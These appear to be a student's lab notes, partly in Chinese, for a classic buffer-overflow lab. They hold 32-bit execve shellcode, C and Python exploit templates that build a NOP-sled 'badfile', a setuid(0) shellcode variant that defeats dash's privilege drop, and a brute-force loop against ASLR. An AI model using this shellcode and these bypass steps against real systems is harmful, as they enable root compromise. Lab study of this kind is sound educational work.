## 2 Lab Task

### 2.1 Turning off countermeasures

`sudo sysctl -w kernel.randomize_va_space=0`

`gcc -fno-stack-protector example.c`

`gcc -z execstack -o test test.c`或`gcc -z noexecstack -o test test.c`

**For Set-UID program**

dash对Set-UID存在反制措施.

```shell
sudo rm /bin/sh
sudo ln -s /bin/zsh /bin/sh
```

### 2.2 Task 1: Running Shellcode

```c
#include <stdio.h>

int main()
{
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}

```

```c
/* call_shellcode.c */
/* You can get this program from the lab’s website */
/* A program that launches a shell using shellcode */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
	"\x31\xc0" /* Line 1: xorl %eax,%eax */
	"\x50" /* Line 2: pushl %eax */
	"\x68""//sh" /* Line 3: pushl $0x68732f2f */
	"\x68""/bin" /* Line 4: pushl $0x6e69622f */
	"\x89\xe3" /* Line 5: movl %esp,%ebx */
	"\x50" /* Line 6: pushl %eax */
	"\x53" /* Line 7: pushl %ebx */
	"\x89\xe1" /* Line 8: movl %esp,%ecx */
	"\x99" /* Line 9: cdq */
	"\xb0\x0b" /* Line 10: movb $0x0b,%al */
	"\xcd\x80" /* Line 11: int $0x80 */
;

int main(int argc, char **argv)
{
	char buf[sizeof(code)];
	strcpy(buf, code);
	((void(*)( ))buf)( );
}

```

32位Linux系统调用规则,`ebx,ecx,edx,esi,edi`分别传递参数.系统调用编号记录在al中

`gcc -z execstack -o call_shellcode call_shellcode.c`

### 2.3 The Vulnerable Program

`-fno-stack-protector -z execstack`

Change the program to be a Set-UID program.

```shell
sudo chown root stack
sudo chmod 4755 stack
```

### 2.4 Task 2: Exploiting the Vulnerability

```c
/* exploit.c */
/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] =
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x50" /* Line 2: pushl %eax */
"\x68""//sh" /* Line 3: pushl $0x68732f2f */
"\x68""/bin" /* Line 4: pushl $0x6e69622f */
"\x89\xe3" /* Line 5: movl %esp,%ebx */
"\x50" /* Line 6: pushl %eax */
"\x53" /* Line 7: pushl %ebx */
"\x89\xe1" /* Line 8: movl %esp,%ecx */
"\x99" /* Line 9: cdq */
"\xb0\x0b" /* Line 10: movb $0x0b,%al */
"\xcd\x80" /* Line 11: int $0x80 */
;

void main(int argc, char **argv)
{
	char buffer[517];
	FILE *badfile;
	/* Initialize buffer with 0x90 (NOP instruction) */

	memset(&buffer, 0x90, 517);
	/* You need to fill the buffer with appropriate contents here */
	/* ... Put your code here ... */
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);       // 朝badfile里写入一个517bytes大小的块
	fclose(badfile);
}

```

通过exploit，可以得到`#`，但真实user id没有变(有效的user id是root)

```shell
# id
uid=(500) euid=0(root)
```

许多命令的行为会因此发生变化，因为发现真实user id不是root，所以运行以下程序将真实user id改为root

```c
void main()
{
	setuid(0); system("/bin/sh");
}
```

Python版exploit

```python
#!/usr/bin/python3
import sys

shellcode= (
	"\x31\xc0" # xorl %eax,%eax
	"\x50" # pushl %eax
	"\x68""//sh" # pushl $0x68732f2f
	"\x68""/bin" # pushl $0x6e69622f
	"\x89\xe3" # movl %esp,%ebx
	"\x50" # pushl %eax
	"\x53" # pushl %ebx
	"\x89\xe1" # movl %esp,%ecx
	"\x99" # cdq
	"\xb0\x0b" # movb $0x0b,%al
	"\xcd\x80" # int $0x80
	"\x00"
	).encode(’latin-1’)

# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
#########################################################################
# Replace 0 with the correct offset value
D = 0
# Fill the return address field with the address of the shellcode
# Replace 0xFF with the correct value
content[D+0] = 0xFF # fill in the 1st byte (least significant byte)
content[D+1] = 0xFF # fill in the 2nd byte
content[D+2] = 0xFF # fill in the 3rd byte
content[D+3] = 0xFF # fill in the 4th byte (most significant byte)
#########################################################################
# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode
# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
```

### Task 3: Defeat dash's Countermeasure

dash's changelog

```c
// https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz
// main() function in main.c has following changes:
++ uid = getuid();
++ gid = getgid();
++ /*
++ * To limit bogus system(3) or popen(3) calls in setuid binaries,
++ * require -p flag to work in this situation.
++ */
++ if (!pflag && (uid != geteuid() || gid != getegid())) { ➀
    
++ 		setuid(uid);
++ 		setgid(gid);
++ /* PS1 might need to be changed accordingly. */
++ 		choose_ps1();
++ }
```

可以在执行shell之前setuid一下，这样可以绕过检测。（原理还不曾查找。。。。

可通过以下程序进行测试验证

```c
// dash_shell_test.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
	char *argv[2];
	argv[0] = "/bin/sh";
	argv[1] = NULL;
	// setuid(0); ➀
	execve("/bin/sh", argv, NULL);
	return 0;
}
```

```shell
$ gcc dash_shell_test.c -o dash_shell_test
$ sudo chown root dash_shell_test
$ sudo chmod 4755 dash_shell_test
```

改变之后的shellcode

```c
char shellcode[] =
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
"\xb0\xd5" /* Line 3: movb $0xd5,%al */
"\xcd\x80" /* Line 4: int $0x80 */
// ---- The code below is the same as the one in Task 2 ---
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
```

前四行调用`setuid(0)`

### 2.6 Task 6: Defeating Address Randomization

在32位的机器上，栈起始地址的可能性只有19位，也就是 $2^{19} = 524288$ 种可能，这个空间并不大存在遍历的可能。

打开地址随机化`$ sudo /sbin/sysctl -w kernel.randomize_va_space=2`

使用shell script来进行遍历

```shell
#!/bin/bash

SECONDS=0
value=0

while [1]
  do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far." 
  ./stack
done
```

### 2.7 Task 5: Turn on the StackGuard Protection

gcc 4.3.3或更高版本，默认开启此保护。

### 2.8 Task 6: Turn on the non-Executable Stack Protection

`$ gcc -o stack -fno-stack-protector -z noexecstack stack.c` 开启栈不可执行保护

## 心得体会

`strcpy` 之类的字符串处理函数对于`\x00` 敏感